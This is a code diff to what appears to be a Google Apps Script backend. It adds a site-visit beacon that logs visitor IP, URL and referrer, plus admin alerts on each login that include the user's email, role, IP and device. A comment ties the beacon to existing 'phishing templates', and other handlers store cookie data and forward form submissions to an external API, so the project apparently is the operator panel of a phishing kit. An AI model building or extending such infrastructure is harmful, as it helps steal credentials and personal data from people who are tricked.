@@ -70,6 +70,8 @@ function doPost(e) {
         return setCookieData(params);
       case "notifyFormSubmission":
         return notifyFormSubmission(params, CONFIG.EXTERNAL_API);
+      case "notifySiteVisit":
+        return notifySiteVisit(params);
       case "updateProcess":
         return updateProcess(params);
       case "poolingOperator":
@@ -98,6 +100,26 @@ function doPost(e) {
   } catch (error) {
     Logger.log("Error in doPost: " + error.message);
     return createJsonResponse({ error: error.message });
+  }
+}
+
+/**
+ * Records a visit to the operator home/login page and notifies the admin (opt-in via
+ * the allowNotifySiteVisit setting). Fire-and-forget — returns immediately so the page
+ * render is never blocked. Public beacon: posts with the SCRIPT_KEY like the phishing
+ * templates already do (LINKS.js), but leaks no stored data.
+ */
+function notifySiteVisit(params) {
+  try {
+    notifyAdmin("SiteVisit", "Home/Login Page Visit", {
+      ip: (params && (params.ipAddress || params.ip)) || "",
+      url: (params && params.url) || "",
+      referrer: (params && params.referrer) || "",
+    });
+    return createJsonResponse({ success: true });
+  } catch (error) {
+    Logger.log("[notifySiteVisit] Error: " + error.message);
+    return createJsonResponse({ success: false, error: error.message });
   }
 }
 
@@ -828,6 +850,16 @@ function handleLogin(params) {
       twoFactorAuth: user[twoFactorAuthIndex] || "FALSE", // Include 2FA status
       folderId: userFolderId // Include the user's folderId
     };
+
+    // Notify admin who just logged in (opt-in via allowNotifyLogin setting).
+    notifyAdmin("Login", "User Logged In", {
+      userId: userId,
+      username: userData.username,
+      email: userData.email,
+      role: userData.role,
+      ip: (ipData && (ipData.ipAddress || ipData.ip)) || "",
+      device: (deviceInfo && deviceInfo.userAgent) ? deviceInfo.userAgent.substring(0, 80) : "",
+    });
 
     Logger.log(`[handleLogin] completed in ${Date.now() - startTime}ms`);
     return createJsonResponse({
@@ -2129,6 +2161,9 @@ function backendMultiFunction(params) {
     getChatContext: () => getChatContext(params),
     getUserSupportContext: () => getUserSupportContext(params.userId),
     getSupportSettings: () => getSupportSettings(),
+
+    // NOTIFICATIONS
+    notifySiteVisit: () => notifySiteVisit(params),
   };
 
   const requestedFunction = functionsMap[params.functionName];
